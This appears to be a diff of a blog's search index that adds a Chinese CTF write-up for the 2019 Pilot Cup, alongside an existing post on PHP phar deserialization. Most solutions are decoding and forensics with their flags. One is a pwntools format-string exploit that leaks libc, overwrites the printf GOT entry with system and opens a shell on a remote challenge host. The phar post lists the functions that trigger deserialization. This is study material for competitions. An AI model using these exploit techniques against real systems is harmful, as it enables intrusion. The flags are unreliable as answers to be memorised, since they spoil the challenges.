@@ -6,6 +6,17 @@
     <content type="text"><![CDATA[TODO…约束自己执行想要执行的事情 This is my TODO… 还在学习中…]]></content>
   </entry>
   <entry>
+    <title><![CDATA[2019领航杯WP]]></title>
+    <url>%2F2019%E9%A2%86%E8%88%AA%E6%9D%AFWP.html</url>
+    <content type="text"><![CDATA[1.编码编码base64解码即可得到flag! flag:welcometothepilotcup 2.取证分析 利用脚本得到flag.png，用winhex删除开头多余数据，png文件头为89 50 开头 结尾是AE 42 60 82 去除掉无用信息，得到flag，b91011fc 3.stegano l打开查看源码，得到flag就是passwd：后面字符 steganoI flag:steganol 4.steganobinwalk查看文件 foremost分离文件 得到flag flag:EORDFFOMFPMA 5.lsb用StegSolve打开图片，调制Red pane 3 即可得到flag flag:ONPGRAMBCICM 6.恢复与解密下载附件,将其中的xty.img使用Diskgenius打开. 选择恢复文件 打开其中的INode00000010,可以看到密文 aWdxNDs3NDFSOzFpa1I1MWliT08waWdx 使用脚本对密文进行解密 1234567891011121314151617import stringfrom base64 import *b=b64decode("aWdxNDs3NDFSOzFpa1I1MWliT08waWdx")data=list(b)for k in range(0,200): key="" for i in range(len(data)): key+=chr(ord(data[i])^k) print (key) 结果中没有特殊符号的则是flag flag:jdr78472Q82jhQ62jaLL3jdr 7.文件提取下载附件,使用记事本打开flag.exe.将其中的base64编码转换成图片 用记事本打开图片,可以在图片的最后看到flag flag{068EEF6A7BAD3FDF} 8.凯撒1使用凯撒密码转换密文. 最后一个单词是flag flag:moconlfpeold 9.凯撒2payload: 12345678910111213141516171819202122a = "0B 33 33 28 20 2E 33 26 70 20 3D 33 39 20 37 33 30 3A 29 28 20 33 32 29 20 31 33 36 29 20 27 2C 25 30 30 29 32 2B 29 20 2D 32 20 3D 33 39 36 20 2E 33 39 36 32 29 3D 72 20 18 2C 2D 37 20 33 32 29 20 3B 25 37 20 2A 25 2D 36 30 3D 20 29 25 37 3D 20 38 33 20 27 36 25 27 2F 72 20 1B 25 37 32 6B 38 20 2D 38 03 20 75 76 7C 20 2F 29 3D 37 20 2D 37 20 25 20 35 39 2D 38 29 20 37 31 25 30 30 20 2F 29 3D 37 34 25 27 29 70 20 37 33 20 2D 38 20 37 2C 33 39 30 28 32 6B 38 20 2C 25 3A 29 20 38 25 2F 29 32 20 3D 33 39 20 38 33 33 20 30 33 32 2B 20 38 33 20 28 29 27 36 3D 34 38 20 38 2C 2D 37 20 31 29 37 37 25 2B 29 72 20 1B 29 30 30 20 28 33 32 29 70 20 3D 33 39 36 20 37 33 30 39 38 2D 33 32 20 2D 37 20 31 25 37 37 32 34 2A 33 25 37 26 37 72"ls = []for i in a.split(' '): ls.append(int(i, 16))print(ls)for i in range(-100, 100): try: for j in ls: print(chr(j+i), end='') print() except: pass 得到flag如图中阴影 10.ascii12345678910111213&gt;&gt;&gt; l=[84,104,101,32,115,111,108,117,116,105,111,110,32,105,115,58,32,105,104,98,100,115,105,101,111, 112,100,99,110]&gt;&gt;&gt; a=''&gt;&gt;&gt; for i in l:... a+=chr(i)...&gt;&gt;&gt; a'The solution is: ihbdsieopdcn' flag:ihbdsieopdcn 11.forensicsbinwalk查看文件 foremost分离文件 查看有用信息得到图片就是flag flag:360HA360 12.usb发现是usb协议的流量分析然后找到了罗技 然后我们查看数据发现代表着鼠标的移动，导出数据到a.txt 12345678910111213141516171819202122232425262728293031323334353637383900: ff :00:0000: ff :00:0000: ff :00:0000: fd: 00: 0000: ff :00:0000: ff :00:0000: fe: ff :0000: fd: 00:0000: fb:00: 0000: fc :00:0000: fb:00:0000: fc :00:0000: fc: ff :0000: fe: 00: 0000:fe:ff:0000: fe:00:0000: ff :00: 0000: fe:ff :0000: ff: ff :0001 :00: 00:00 然后我们转换坐标 awk -F: ‘function comp(v){if(v&gt;127)v-=256;return v}{x+=comp(strtonum(“0x”$2));y+=comp(strtonum(“0x”$3))}$1==”01”{print x,y}’ a.txt &gt; b.txt 得到坐标后用gnuplot画出flag即可 flag为tHe_CAT_is_the_CULpRiT 14.MasterofZip-Middle爆破得到password! 得到伪加密的包用winhex修改为00 得到flag.png用winhex审计后发现高度不够 我们调整高度后最终得到flag flag{b2599e17dd7c48ae62d008a1a145cc6d9928d4ac} 15.数据包分析-Easy导出HTTP所有文件 得到flag.php，即flag flag{3eyufhnj87} 16.easyelfangr求解即可 flag{Thunk_c0des_xoR_thr3e_de4l} 22.giaopayload: 即可得到flag{5f284498df} 23.easy_fmt1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495from pwn import *context.log_level = 'debug'p = process('./easy_fmt')e = ELF('./easy_fmt')libc=ELF("/libc64.so")p=remote("39.104.173.175","15502")get_libc_payload = "%7$s".ljust(8, 'a')+p64(e.got['read'])p.send(get_libc_payload)read_libc = u64(p.recv(6)+'\x00\x00')print hex(read_libc)begin_libc = read_libc-libc.symbols['read']print hex(begin_libc)one_gadget_libc = begin_libc+libc.symbols['system']print hex(one_gadget_libc)a1 = (one_gadget_libc &amp; 0xff0000) &gt;&gt; 16a2 = (one_gadget_libc &amp; 0xff00) &gt;&gt; 8a3 = one_gadget_libc &amp; 0xffprint hex(a1)+hex(a2)+hex(a3)point1 = [2, a1]point2 = [1, a2]point3 = [0, a3]def swap(p1, p2): for i in range(2): t = p1[i] p1[i] = p2[i] p2[i] = tif a1 &gt; a2: swap(point1, point2)if a1 &gt; a3: swap(point1, point3)if a2 &gt; a3: swap(point2, point3)print point1+point2+point3point2[1] = point2[1]-point1[1]point3[1] = point3[1]-point2[1]-point1[1]print point1+point2+point3write_got_payload = '%'+str(point1[1])+'c'+'%12$hhn'write_got_payload += '%'+str(point2[1])+'c'+'%13$hhn'write_got_payload += '%'+str(point3[1])+'c'+'%14$hhn'write_got_payload = write_got_payload.ljust(48, 'a')write_got_payload += p64(e.got['printf']+point1[0])write_got_payload += p64(e.got['printf']+point2[0])write_got_payload += p64(e.got['printf']+point3[0])p.send(write_got_payload)sleep(1)p.sendline("/bin/sh\x00")p.interactive() 得到flag{279920429c} 24.EasyRE flag{Let_Us_st4rt_R3v3rSe} 25.EASYReverseida查看程序，发现是个没有查表的base64，遂用脚本分离出了前一部分 最后三个字节手动拼凑得到正确flag flag{JSe3psfxa2X96USgM58346t4Ta87uRQy}]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>wp</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[phar反序列化]]></title>
     <url>%2Fphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html</url>
     <content type="text"><![CDATA[漏洞作用在不使用unserialize()函数的情况下触发PHP反序列化漏洞 触发条件使用phar://协议读取文件的时候，文件内容会被解析成phar对象，然后phar对象内的Meta data 信息会被反序列化 如果要生成phar文件，要在php.ini中把phar只读给关闭 123php.ini[Phar]phar.readonly = Off 案例演示1234567891011121314&lt;?php$phar = new Phar('test.phar');$phar-&gt;startBuffering();$phar-&gt;addFromString('test.txt', 'text');$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ? &gt;'); // add object of any class as meta dataclass AnyClass &#123;&#125;$object = new AnyClass;$object-&gt;data = 'rips';$phar-&gt;setMetadata($object);$phar-&gt;stopBuffering(); 1php -c /Applications/XAMPP/xamppfiles/etc/php.ini phar.php //执行生成的文件如下 1234567891011121314&lt;?php// add object of any class as meta dataclass AnyClass &#123; function __destruct()&#123; echo $this-&gt;data; &#125; function __sleep()&#123; echo 'sleep'; &#125; function __wakeup()&#123; echo 'wakeup&lt;br&gt;'; &#125;&#125;include('phar://test.phar'); // 触发反序列化 能够触发反序列化的函数有12345678910include('phar://test.phar');var_dump(file('phar://test.phar'));var_dump(fopen('phar://test.phar','r'));var_dump(file_get_contents('phar://test.phar'));var_dump(file_get_contents('phar://test.jpg'));(把文件名改成jpg也有效)var_dump(file_exists('phar://test.phar'));file_exists($_GET['file']);md5_file($_GET['file']);filemtime($_GET['file']);filesize($_GET['file']); referhttps://mp.weixin.qq.com/s/TNAdeBNBErYjtTGGfentFg]]></content>
@@ -234,8 +245,8 @@
         <category>reverse</category>
       </categories>
       <tags>
-        <tag>jactf</tag>
         <tag>reverse</tag>
+        <tag>jactf</tag>
       </tags>
   </entry>
   <entry>
@@ -246,8 +257,8 @@
         <category>reverse</category>
       </categories>
       <tags>
-        <tag>jactf</tag>
         <tag>reverse</tag>
+        <tag>jactf</tag>
       </tags>
   </entry>
   <entry>
@@ -280,8 +291,8 @@
         <category>pwn</category>
       </categories>
       <tags>
-        <tag>pwn</tag>
         <tag>writeup</tag>
+        <tag>pwn</tag>
         <tag>pwnable.tw</tag>
       </tags>
   </entry>
@@ -293,8 +304,8 @@
         <category>pwn</category>
       </categories>
       <tags>
-        <tag>heap</tag>
         <tag>pwn</tag>
+        <tag>heap</tag>
       </tags>
   </entry>
   <entry>
@@ -305,9 +316,9 @@
         <category>pwn</category>
       </categories>
       <tags>
-        <tag>pwn</tag>
         <tag>writeup</tag>
         <tag>pwntools</tag>
+        <tag>pwn</tag>
         <tag>rop</tag>
       </tags>
   </entry>
